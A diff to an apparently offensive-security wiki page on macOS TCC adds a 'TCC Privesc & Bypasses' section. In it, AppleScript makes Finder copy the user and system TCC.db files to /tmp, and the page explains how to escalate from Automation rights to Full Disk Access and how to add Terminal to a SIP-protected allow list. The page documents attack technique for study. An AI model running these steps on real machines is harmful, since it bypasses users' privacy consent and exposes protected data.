@@ -146,53 +146,6 @@ tccutil reset All app.some.id
 tccutil reset All
 ```
 
-### Privesc from User TCC DB to FDA
-
-Obtaining **write permissions** over the **user TCC** database you **can'**t grant yourself **`FDA`** permissions, only the one that lives in the system database can grant that.
-
-But you can **can** give yourself **`Automation rights to Finder`, and since `Finder` has `FDA`, so do you.**
-
-### **Privesc from FDA to TCC permissions**
-
-This is straight forward, if you controls a program with FDA you can **modify the users TCC database and give yourself any access**.
-
-### **From SIP Bypass to TCC Bypass**
-
-The system **TCC database** is protected by **SIP**, thats why only processes with the **indicated entitlements  are going to be able to modify** it. Therefore, if an attacker finds a **SIP bypass** over a **file** (be able to modify a file restricted by SIP), he will be able **remove the protection** of a TCC database, and give himself all TCC permissions.
-
-However, there is another option to abuse this **SIP bypass to bypass TCC**, the file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is an allow list of applications that require a TCC exception. Therefore, if an attacker can **remove the SIP protection** from this file and add his **own application** the application ill be able to bypass TCC.\
-For example to add terminal:
-
-```bash
-# Get needed info
-codesign -d -r- /System/Applications/Utilities/Terminal.app
-```
-
-AllowApplicationsList.plist:
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0">
-<dict>
-	<key>Services</key>
-	<dict>
-		<key>SystemPolicyAllFiles</key>
-		<array>
-			<dict>
-				<key>CodeRequirement</key>
-				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
-				<key>IdentifierType</key>
-				<string>bundleID</string>
-				<key>Identifier</key>
-				<string>com.apple.Terminal</string>
-			</dict>
-		</array>
-	</dict>
-</dict>
-</plist>
-```
-
 ### TCC Signature Checks
 
 The TCC **database** stores the **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the App asking to use the a permission is the correct one.
@@ -274,6 +227,103 @@ Also note that if you move a file that allows the UUID of an app in your compute
 
 The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.
 
+## TCC Privesc & Bypasses
+
+### Privesc from Automation to FDA
+
+**Finder** is an application that **always has FDA** (even if it doesn't appear in the UI), so if you have **Automation** privileges over it, you can abuse its privileges to **make it do some actions**.
+
+{% tabs %}
+{% tab title="Steal users TCC.db" %}
+```applescript
+# This AppleScript will copy the system TCC database into /tmp
+osascript<<EOD
+tell application "Finder"
+    set homeFolder to path to home folder as string
+    set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
+    set targetFolder to POSIX file "/tmp" as alias
+
+    try
+        duplicate file sourceFile to targetFolder with replacing
+    on error errMsg
+        display dialog "Error: " & errMsg
+    end try
+end tell
+EOD
+```
+{% endtab %}
+
+{% tab title="Steal systems TCC.db" %}
+```applescript
+osascript<<EOD
+tell application "Finder"
+    set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
+    set targetFolder to POSIX file "/tmp" as alias
+
+    try
+        duplicate file sourceFile to targetFolder with replacing
+    on error errMsg
+        display dialog "Error: " & errMsg
+    end try
+end tell
+EOD
+```
+{% endtab %}
+{% endtabs %}
+
+You could abuse this to **write your own user TCC database**.
+
+This is the TCC prompt to get Automation privileges over Finder:
+
+<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>
+
+### Privesc from User TCC DB to FDA
+
+Obtaining **write permissions** over the **user TCC** database you **can'**t grant yourself **`FDA`** permissions, only the one that lives in the system database can grant that.
+
+But you can **can** give yourself **`Automation rights to Finder`**, and abouse the previous technique to escalate to FDA.
+
+### **Privesc from FDA to TCC permissions**
+
+I don't thing this is a real privesc, but just in case you find it useful: If you controls a program with FDA you can **modify the users TCC database and give yourself any access**. This can be useful as a persistence technique in case you might lose your FDA permissions.
+
+### **From SIP Bypass to TCC Bypass**
+
+The system **TCC database** is protected by **SIP**, thats why only processes with the **indicated entitlements  are going to be able to modify** it. Therefore, if an attacker finds a **SIP bypass** over a **file** (be able to modify a file restricted by SIP), he will be able **remove the protection** of a TCC database, and give himself all TCC permissions.
+
+However, there is another option to abuse this **SIP bypass to bypass TCC**, the file `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` is an allow list of applications that require a TCC exception. Therefore, if an attacker can **remove the SIP protection** from this file and add his **own application** the application ill be able to bypass TCC.\
+For example to add terminal:
+
+```bash
+# Get needed info
+codesign -d -r- /System/Applications/Utilities/Terminal.app
+```
+
+AllowApplicationsList.plist:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Services</key>
+	<dict>
+		<key>SystemPolicyAllFiles</key>
+		<array>
+			<dict>
+				<key>CodeRequirement</key>
+				<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
+				<key>IdentifierType</key>
+				<string>bundleID</string>
+				<key>Identifier</key>
+				<string>com.apple.Terminal</string>
+			</dict>
+		</array>
+	</dict>
+</dict>
+</plist>
+```
+
 ### TCC Bypasses
 
 {% content-ref url="macos-tcc-bypasses/" %}
@@ -284,7 +334,8 @@ The extended attribute `com.apple.macl` **can’t be cleared** like other extend
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
-*   [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
+*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
 
 
 
